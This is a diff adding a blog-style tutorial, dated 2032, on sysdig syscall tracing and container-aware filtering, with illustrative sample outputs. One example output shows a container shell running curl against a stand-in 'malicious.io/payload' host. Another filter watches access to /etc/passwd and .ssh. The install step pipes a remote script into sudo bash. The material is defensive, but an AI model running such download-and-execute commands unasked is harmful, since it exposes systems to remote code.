@@ -1,0 +1,134 @@
+---
+title: "sysdig: container-aware syscall tracing with filter expressions"
+date: "2032-06-26"
+excerpt: "sysdig captures system calls from every process on the machine — including processes inside containers — and lets you filter, aggregate, and inspect them with a powerful expression language. Unlike strace (which attaches to one process via ptrace), sysdig uses a kernel driver or eBPF probe to capture all events system-wide with low overhead. It's container-aware: you can filter by container name, pod, or image. The -c flag (chisel) runs built-in analysis programs: topprocs_net shows network usage by process, spy_file tails file I/O, and topconns shows active connections by bandwidth."
+author: "Lewis Wilson"
+tag: "Build Log"
+---
+
+System-wide capture. Container-aware. Filter by container name, process, fd, or event type.
+
+## System-wide tracing and top-N views
+
+```bash
+# Install sysdig (uses eBPF probe — no kernel module needed on 4.14+)
+curl -s https://s3.amazonaws.com/download.draios.com/stable/install-sysdig | sudo bash
+
+# Use eBPF driver (safer for production — no kernel module)
+sudo SYSDIG_BPF_PROBE="" sysdig
+
+# Top processes by network I/O (updated every second)
+sudo sysdig -c topprocs_net
+# Bytes    Process       PID    Fd
+# 48.2MB   construx-api  1847   12
+# 12.4MB   postgres      3241   28
+
+# Top connections by bytes
+sudo sysdig -c topconns
+# Bytes    Proto  Sip:Sport            Dip:Dport
+# 48.2MB   tcp    10.0.1.100:42871     0.0.0.0:8080
+# 12.4MB   tcp    127.0.0.1:41982      127.0.0.1:5432
+
+# Top files by I/O
+sudo sysdig -c topfiles_bytes
+# Bytes    Filename                      Process
+# 1.2MB    /var/lib/postgresql/data/...  postgres
+# 384KB    /var/log/construx/api.log     construx-api
+
+# Top processes by CPU (using syscall count as a proxy)
+sudo sysdig -c topprocs_cpu
+
+# Spy on all file writes to /etc (detect config tampering)
+sudo sysdig -c spy_file /etc
+# 2032-06-05 14:47:03 construx-api wrote /etc/construx/config.yaml (38 bytes)
+```
+
+## Filter expressions and output formatting
+
+```bash
+# Filter syntax: field op value [and/or ...]
+# Fields: proc.name, proc.pid, fd.name, evt.type, container.name, user.name
+
+# All events from construx-api
+sudo sysdig proc.name=construx-api
+
+# Only network events from construx-api
+sudo sysdig "proc.name=construx-api and evt.is_io_net=true"
+
+# Only file opens (openat syscall)
+sudo sysdig evt.type=openat
+
+# Sensitive file access across all containers
+sudo sysdig "evt.type=openat and (fd.name contains '/etc/passwd' or fd.name contains '/.ssh')"
+
+# Custom output format with -p
+sudo sysdig -p "%evt.time %container.name %proc.name %evt.type %fd.name %evt.buflen" \
+  "evt.type in (read,write,openat) and container.name contains construx"
+# 14:32:07.441201 construx-api construx-api read  10.0.1.100:42871->0.0.0.0:8080 2048
+
+# Show only write events with their content (useful for debugging API responses)
+sudo sysdig -s 1024 -A "proc.name=construx-api and evt.type=write and fd.name contains '8080'"
+# writes contents of each syscall buffer as ASCII
+
+# Summarise events by type for a process
+sudo sysdig -c evt_summary proc.name=construx-api
+# Event               Count
+# read                12847
+# write               12841
+# epoll_wait            509
+# futex                 302
+```
+
+## Container-aware filtering
+
+```bash
+# Filter by container name (works for Docker, containerd, podman)
+sudo sysdig "container.name=construx-api-6d9f5c4b8-xk2pq"
+
+# See all containers generating events
+sudo sysdig -c lscontainers
+
+# Everything happening inside Kubernetes pods (exclude host processes)
+sudo sysdig "container.name!=host"
+
+# Map network connections to containers
+sudo sysdig -c topconns "container.name!=host"
+
+# Find containers that are exec-ing unexpected processes
+sudo sysdig "evt.type=execve and container.name!=host" \
+  -p "%evt.time %container.name %proc.name %proc.args"
+# 14:41:30 construx-worker  sh  -c "curl http://malicious.io/payload"
+# ← alert: shell executed inside construx-worker pod
+
+# Which containers are writing to /tmp?
+sudo sysdig "evt.type=openat and fd.name contains '/tmp' and container.name!=host" \
+  -p "%container.name %proc.name %fd.name"
+
+# Kubernetes pod label-based filtering (sysdig with Kubernetes metadata)
+sudo sysdig -k http://localhost:8001 "k8s.pod.label.app=construx-api"
+```
+
+## Capture to file and offline replay
+
+```bash
+# Capture to a .scap file (like a pcap, but for syscalls)
+sudo sysdig -w /tmp/construx-incident.scap "proc.name=construx-api"
+# ^C to stop
+# 38241 events captured (14.8 MB)
+
+# Replay from file with different filters (post-incident forensics)
+sysdig -r /tmp/construx-incident.scap "evt.type=openat"
+sysdig -r /tmp/construx-incident.scap -c spy_file /etc
+
+# Rotate capture files (ring buffer — like tcpdump -C)
+sudo sysdig -W 3 -G 300 -w /var/log/sysdig/capture.scap
+# Writes capture-001.scap, capture-002.scap, capture-003.scap (300s each), then overwrites
+
+# Falco uses the same eBPF driver as sysdig — they share the event stream
+# sysdig is for interactive exploration; Falco is for production alerting
+# You can replay a sysdig capture through Falco for offline rule testing:
+falco -r /tmp/construx-incident.scap
+# 14:41:30 Warning: Shell spawned in container (container=construx-worker ...)
+```
+
+sysdig vs strace vs bpftrace: strace attaches to one process via ptrace and reports every syscall — it's simple but has high overhead (every syscall creates two context switches to the ptrace handler) and can't observe multiple processes at once. bpftrace is low-overhead eBPF scripting — you write programs that run in kernel context, ideal for custom metrics and tracing. sysdig captures all syscalls system-wide using the same eBPF infrastructure as bpftrace, but presents them through a high-level filter language with container metadata. It's the right tool when you need to correlate events across processes, filter by container, or capture and replay for forensics. For a specific per-process debug, strace is simpler. For kernel-level custom tracing, bpftrace is more powerful. sysdig sits in the middle: broad capture, container context, good filtering — without writing BPF programs.
